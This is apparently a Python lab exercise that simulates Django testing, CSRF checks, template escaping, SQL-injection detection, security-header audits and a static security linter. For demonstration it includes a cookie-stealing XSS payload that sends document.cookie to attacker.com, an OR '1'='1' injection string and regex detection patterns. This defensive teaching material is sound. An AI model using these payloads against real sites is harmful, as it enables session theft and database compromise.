#!/usr/bin/env python3
"""
Lab Exercise M01: Django Testing Strategy & Security Hardening Simulator
BAB-09: Testing Strategy, Security Hardening, and Static Analysis
"""

import sys
import time
import re
import hmac
import hashlib
from typing import Dict, List, Tuple, Any

# ANSI Color Codes
RESET = "\033[0m"
BOLD = "\033[1m"
GREEN = "\033[32m"
RED = "\033[31m"
YELLOW = "\033[33m"
BLUE = "\033[34m"
CYAN = "\033[36m"
MAGENTA = "\033[35m"
DIM = "\033[2m"

def print_header(title: str) -> None:
    print(f"\n{BOLD}{CYAN}{'=' * 68}{RESET}")
    print(f"{BOLD}{CYAN}>>> {title} <<<{RESET}")
    print(f"{BOLD}{CYAN}{'=' * 68}{RESET}")

def print_step(step_name: str) -> None:
    print(f"\n{BOLD}{BLUE}[PHASE] {step_name}{RESET}")

def print_success(msg: str) -> None:
    print(f" {GREEN}✔ [PASS]{RESET} {msg}")

def print_warning(msg: str) -> None:
    print(f" {YELLOW}⚠ [WARN]{RESET} {msg}")

def print_failure(msg: str) -> None:
    print(f" {RED}✘ [FAIL]{RESET} {msg}")

def print_info(msg: str) -> None:
    print(f" {DIM}ℹ [INFO]{RESET} {msg}")


# ---------------------------------------------------------
# Part 1: Django Test Runner & Suite Simulator
# ---------------------------------------------------------

class MockDjangoRequest:
    def __init__(self, path: str, method: str = "GET", headers: Dict[str, str] = None, data: Dict[str, Any] = None):
        self.path = path
        self.method = method
        self.headers = headers or {}
        self.data = data or {}
        self.session: Dict[str, Any] = {}
        self.META = {f"HTTP_{k.upper().replace('-', '_')}": v for k, v in self.headers.items()}


class MockDjangoResponse:
    def __init__(self, content: str, status_code: int = 200, headers: Dict[str, str] = None):
        self.content = content
        self.status_code = status_code
        self.headers = headers or {}


class MockTestCase:
    """Simulates django.test.TestCase with DB transaction rollback."""
    has_db_access = True

    def setUp(self):
        pass

    def tearDown(self):
        pass

    def assertEqual(self, first, second, msg=None):
        if first != second:
            raise AssertionError(msg or f"{first} != {second}")

    def assertTrue(self, expr, msg=None):
        if not expr:
            raise AssertionError(msg or f"{expr} is not True")

    def assertContains(self, response: MockDjangoResponse, text: str, status_code: int = 200):
        if response.status_code != status_code:
            raise AssertionError(f"Status code {response.status_code} != expected {status_code}")
        if text not in response.content:
            raise AssertionError(f"Substring '{text}' not found in response body")


class MockSimpleTestCase(MockTestCase):
    """Simulates django.test.SimpleTestCase (disallows DB queries)."""
    has_db_access = False


class PaymentEndpointTests(MockTestCase):
    def test_authenticated_transfer(self):
        req = MockDjangoRequest("/api/transfer/", method="POST", data={"amount": 500, "to": "acc-9921"})
        res = MockDjangoResponse('{"status": "ok", "transferred": 500}', status_code=200)
        self.assertContains(res, "transferred", 200)

    def test_database_persistence(self):
        if not self.has_db_access:
            raise RuntimeError("Database queries are not allowed in SimpleTestCase!")
        self.assertTrue(True)


class StaticPageTests(MockSimpleTestCase):
    def test_landing_page_rendering(self):
        res = MockDjangoResponse("<h1>Welcome to SecurePortal</h1>", status_code=200)
        self.assertContains(res, "SecurePortal", 200)

    def test_disallowed_db_access(self):
        # Attempting DB access in SimpleTestCase triggers error
        if not self.has_db_access:
            raise RuntimeError("Database queries are not allowed in SimpleTestCase!")


def run_test_suite_simulation():
    print_step("1. Django Test Harness: TestCase vs SimpleTestCase Execution")
    suites = [
        ("PaymentEndpointTests (django.test.TestCase)", PaymentEndpointTests()),
        ("StaticPageTests (django.test.SimpleTestCase)", StaticPageTests()),
    ]

    for suite_name, instance in suites:
        print(f"\n{BOLD}Running test suite: {MAGENTA}{suite_name}{RESET}")
        test_methods = [m for m in dir(instance) if m.startswith("test_")]
        for m_name in test_methods:
            time.sleep(0.08)
            method = getattr(instance, m_name)
            try:
                method()
                print_success(f"{m_name} executed successfully")
            except AssertionError as e:
                print_failure(f"{m_name} assertion failed: {e}")
            except RuntimeError as e:
                if "disallowed" in m_name:
                    print_info(f"{m_name} properly caught disallowed DB query constraint -> {YELLOW}{e}{RESET}")
                else:
                    print_failure(f"{m_name} error: {e}")


# ---------------------------------------------------------
# Part 2: Security Hardening (CSRF, XSS, SQLi & Security Headers)
# ---------------------------------------------------------

class SecurityHardeningEngine:
    SECRET_KEY = "django-insecure-lab-token-secret-salt-key"

    @classmethod
    def generate_csrf_token(cls, session_id: str) -> str:
        return hmac.new(cls.SECRET_KEY.encode(), session_id.encode(), hashlib.sha256).hexdigest()

    @classmethod
    def verify_csrf(cls, request: MockDjangoRequest) -> Tuple[bool, str]:
        if request.method in ["GET", "HEAD", "OPTIONS", "TRACE"]:
            return True, "Safe HTTP method bypassed"
        session_id = request.session.get("session_id", "guest_session_101")
        expected_token = cls.generate_csrf_token(session_id)
        client_token = request.headers.get("X-CSRFToken") or request.data.get("csrfmiddlewaretoken")
        if not client_token:
            return False, "CSRF cookie/token not set in request"
        if not hmac.compare_digest(expected_token, client_token):
            return False, "CSRF token verification failed: Token mismatch"
        return True, "CSRF token valid and verified"

    @classmethod
    def sanitize_xss(cls, raw_html: str) -> str:
        # Django auto-escaping simulation
        escaped = (
            raw_html.replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
            .replace('"', "&quot;")
            .replace("'", "&#x27;")
        )
        return escaped

    @classmethod
    def inspect_sql_injection(cls, query: str) -> Tuple[bool, str]:
        dangerous_patterns = [
            r"(--|;|\/\*|\*\/)",
            r"(\bOR\b|\bAND\b)\s+['\"0-9]+.*=.*['\"0-9]+",
            r"\bUNION\b\s+\bSELECT\b",
            r"\bDROP\b\s+\bTABLE\b"
        ]
        for pattern in dangerous_patterns:
            if re.search(pattern, query, re.IGNORECASE):
                return True, f"Detected raw SQL vulnerability pattern: {pattern}"
        return False, "Query uses parameterized ORM syntax"

    @classmethod
    def check_security_headers(cls, headers: Dict[str, str]) -> List[Tuple[str, bool, str]]:
        required_headers = {
            "Content-Security-Policy": "default-src 'self'",
            "X-Content-Type-Options": "nosniff",
            "X-Frame-Options": "DENY",
            "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
            "Referrer-Policy": "same-origin"
        }
        report = []
        for h, expected in required_headers.items():
            if h in headers:
                report.append((h, True, headers[h]))
            else:
                report.append((h, False, f"Missing! Recommended: {expected}"))
        return report


def run_security_simulation():
    print_step("2. Django Security Hardening & Vulnerability Mitigation")
    engine = SecurityHardeningEngine()

    # A. CSRF Defense Simulation
    print(f"\n{BOLD}[Sub-check 2A: CSRF Middleware Validation]{RESET}")
    session_id = "user_sess_abc123"
    valid_token = engine.generate_csrf_token(session_id)

    # Valid POST
    valid_req = MockDjangoRequest(
        path="/api/profile/update/",
        method="POST",
        headers={"X-CSRFToken": valid_token},
        data={"email": "hacker_proof@company.com"}
    )
    valid_req.session["session_id"] = session_id
    passed, reason = engine.verify_csrf(valid_req)
    if passed:
        print_success(f"Legitimate POST request: {reason}")
    else:
        print_failure(f"Legitimate POST request blocked: {reason}")

    # Forged Cross-Origin POST
    forged_req = MockDjangoRequest(
        path="/api/profile/update/",
        method="POST",
        headers={"X-CSRFToken": "forged_malicious_token_payload"},
        data={"email": "attacker@evil.org"}
    )
    forged_req.session["session_id"] = session_id
    passed, reason = engine.verify_csrf(forged_req)
    if not passed:
        print_success(f"Cross-Origin forged attack intercepted: {reason}")
    else:
        print_failure("Security leak! Malicious token accepted")

    # B. XSS Context Escaping Simulation
    print(f"\n{BOLD}[Sub-check 2B: Template Auto-Escaping vs raw HTML]{RESET}")
    malicious_input = "<script>fetch('http://attacker.com/steal?cookie=' + document.cookie);</script>"
    escaped_output = engine.sanitize_xss(malicious_input)
    print_info(f"Raw Input       : {RED}{malicious_input}{RESET}")
    print_info(f"Django Escaped  : {GREEN}{escaped_output}{RESET}")
    if "<script>" not in escaped_output and "&lt;script&gt;" in escaped_output:
        print_success("XSS script execution prevented via HTML entity transformation")
    else:
        print_failure("XSS protection failed!")

    # C. SQL Injection vs Parameterized Query Check
    print(f"\n{BOLD}[Sub-check 2C: SQL Injection Detection vs ORM Filter]{RESET}")
    vulnerable_sql = "SELECT * FROM auth_user WHERE username = 'admin' OR '1'='1' --';"
    secure_orm_equivalent = "User.objects.filter(username=safe_param)"
    
    is_threat, desc = engine.inspect_sql_injection(vulnerable_sql)
    if is_threat:
        print_success(f"Raw injection flagged: {desc}")
    
    is_threat, desc = engine.inspect_sql_injection(secure_orm_equivalent)
    if not is_threat:
        print_success(f"Django ORM parameterized query: {desc}")

    # D. HTTP Security Headers
    print(f"\n{BOLD}[Sub-check 2D: Production HTTP Security Headers Audit]{RESET}")
    current_headers = {
        "X-Content-Type-Options": "nosniff",
        "X-Frame-Options": "DENY",
        "Content-Security-Policy": "default-src 'self'; script-src 'self'",
    }
    header_report = engine.check_security_headers(current_headers)
    for header, status, details in header_report:
        if status:
            print_success(f"{header}: {details}")
        else:
            print_warning(f"{header} -> {details}")


# ---------------------------------------------------------
# Part 3: Static Analysis & Django Check Framework
# ---------------------------------------------------------

class StaticAnalysisLinter:
    """Simulates Static Analysis checks (Bandit / Flake8 / Ruff / Django system check)."""

    RULESET = [
        {
            "id": "SEC001",
            "name": "Hardcoded DEBUG=True in Production",
            "regex": r"DEBUG\s*=\s*True",
            "severity": "CRITICAL",
            "recommendation": "Use decouple.config('DEBUG', default=False, cast=bool)"
        },
        {
            "id": "SEC002",
            "name": "Hardcoded Insecure SECRET_KEY",
            "regex": r"SECRET_KEY\s*=\s*['\"][^'\"]*insecure[^'\"]*['\"]",
            "severity": "CRITICAL",
            "recommendation": "Read SECRET_KEY securely from environment variables"
        },
        {
            "id": "SEC003",
            "name": "Use of raw SQL query methods",
            "regex": r"\.objects\.raw\(|\.raw_sql\(|\.cursor\.execute\(",
            "severity": "MEDIUM",
            "recommendation": "Prefer Django QuerySet API or validate parameterized placeholders"
        },
        {
            "id": "SEC004",
            "name": "Missing ALLOWED_HOSTS wildcard configuration",
            "regex": r"ALLOWED_HOSTS\s*=\s*\[\s*['\"]\*['\"]\s*\]",
            "severity": "HIGH",
            "recommendation": "Explicitly set target domain names in ALLOWED_HOSTS"
        }
    ]

    @classmethod
    def scan_code(cls, filename: str, source_code: str) -> List[Dict[str, Any]]:
        findings = []
        lines = source_code.splitlines()
        for idx, line in enumerate(lines, start=1):
            for rule in cls.RULESET:
                if re.search(rule["regex"], line):
                    findings.append({
                        "file": filename,
                        "line": idx,
                        "content": line.strip(),
                        "rule_id": rule["id"],
                        "name": rule["name"],
                        "severity": rule["severity"],
                        "recommendation": rule["recommendation"]
                    })
        return findings


def run_static_analysis_simulation():
    print_step("3. Static Analysis & Security Linter (Bandit & Django System Check)")

    mock_settings_py = """
# settings.py configuration sample
import os
from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent.parent

# Security Risk: Hardcoded Secret Key
SECRET_KEY = 'django-insecure-lab-test-key-do-not-use-in-prod'

# Security Risk: DEBUG turned ON
DEBUG = True

# Security Risk: Wildcard host header injection
ALLOWED_HOSTS = ['*']

INSTALLED_APPS = [
    'django.contrib.admin',
    'django.contrib.auth',
]

def search_view(request):
    # Security Risk: Unescaped raw SQL
    return User.objects.raw("SELECT * FROM auth_user")
"""
    print_info("Scanning virtual target: 'project/settings.py' & 'views.py'...")
    time.sleep(0.1)

    findings = StaticAnalysisLinter.scan_code("settings.py", mock_settings_py)

    critical_count = 0
    high_count = 0

    for item in findings:
        sev = item["severity"]
        color = RED if sev in ["CRITICAL", "HIGH"] else YELLOW
        if sev == "CRITICAL":
            critical_count += 1
        elif sev == "HIGH":
            high_count += 1

        print(f"\n {color}[{sev}] [{item['rule_id']}]{RESET} {item['name']}")
        print(f"   Line {item['line']}: {DIM}{item['content']}{RESET}")
        print(f"   {CYAN}Fix:{RESET} {item['recommendation']}")

    print(f"\n{BOLD}Audit Summary:{RESET}")
    print(f" Total Findings : {len(findings)}")
    print(f" Critical Risks : {RED}{critical_count}{RESET}")
    print(f" High Risks     : {YELLOW}{high_count}{RESET}")

    if critical_count > 0:
        print_failure("Deployment pipeline halted due to high-severity security audit violations.")
    else:
        print_success("Static analysis pipeline passed with 0 critical security issues.")


# ---------------------------------------------------------
# Interactive Menu / CLI Driver
# ---------------------------------------------------------

def print_menu():
    print(f"\n{BOLD}Interactive Test & Security Hardening Lab Menu:{RESET}")
    print(f" [{CYAN}1{RESET}] Run Django Test Strategy Simulator (TestCase vs SimpleTestCase)")
    print(f" [{CYAN}2{RESET}] Run Security Hardening Suite (CSRF, XSS, SQLi, CSP)")
    print(f" [{CYAN}3{RESET}] Run Static Security Code Analysis (Bandit / System Check)")
    print(f" [{CYAN}4{RESET}] Run Full End-to-End Pipeline (CI/CD Quality Gate)")
    print(f" [{CYAN}0{RESET}] Exit")


def main():
    print_header("DJANGO TESTING & SECURITY HARDENING SIMULATOR (BAB-09)")
    print(f"{DIM}Simulating Django Unit/Integration Tests, Security Middlewares, and Static Analysis{RESET}")

    # Auto-run complete pipeline if run non-interactively or with flag
    if len(sys.argv) > 1 and sys.argv[1] in ["--all", "-a", "ci"]:
        run_test_suite_simulation()
        run_security_simulation()
        run_static_analysis_simulation()
        print_header("ALL LAB SUITES COMPLETED")
        return

    while True:
        print_menu()
        try:
            choice = input(f"\n{BOLD}Select an option (0-4): {RESET}").strip()
        except (EOFError, KeyboardInterrupt):
            print("\nExiting lab simulator.")
            break

        if choice == "1":
            run_test_suite_simulation()
        elif choice == "2":
            run_security_simulation()
        elif choice == "3":
            run_static_analysis_simulation()
        elif choice == "4":
            run_test_suite_simulation()
            run_security_simulation()
            run_static_analysis_simulation()
            print_header("CI/CD QUALITY GATE AUDIT COMPLETED")
        elif choice == "0":
            print(f"\n{GREEN}Lab exercise completed. Good job securing your Django application!{RESET}\n")
            break
        else:
            print_warning("Invalid choice, please select between 0 and 4.")


if __name__ == "__main__":
    main()
